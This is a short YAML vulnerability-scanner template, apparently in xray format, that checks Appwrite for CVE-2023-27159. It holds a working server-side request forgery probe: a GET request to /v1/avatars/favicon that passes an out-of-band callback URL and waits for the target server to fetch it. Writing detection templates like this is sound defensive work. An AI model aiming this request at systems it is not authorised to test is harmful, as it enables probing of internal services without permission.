name: yaml-poc-appwrite-appwrite-logical-CVE-2023-27159
binding: 0bdf4dc0-076d-4bb6-86e8-b4a9ad47b689
detail:
    author: jiapeng.han
    links:
        - http://appwrite.com
        - https://gist.github.com/b33t1e/43b26c31e895baf7e7aea2dbf9743a9a
        - https://gist.github.com/b33t1e/e9e8192317c111e7897e04d2f9bf5fdb
        - https://github.com/appwrite/appwrite
        - https://notes.sjtu.edu.cn/gMNlpByZSDiwrl9uZyHTKA
    vulnerability:
        id: c1d9d60c-9eab-4947-ad9f-7e4942b07df7
        level: high
    warning: Harmless
transport: http
set:
    reverse: newReverse()
    reverseUrl: reverse.url
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /v1/avatars/favicon?url={{reverseUrl}}
        expression: reverse.wait(3)
expression: r0()
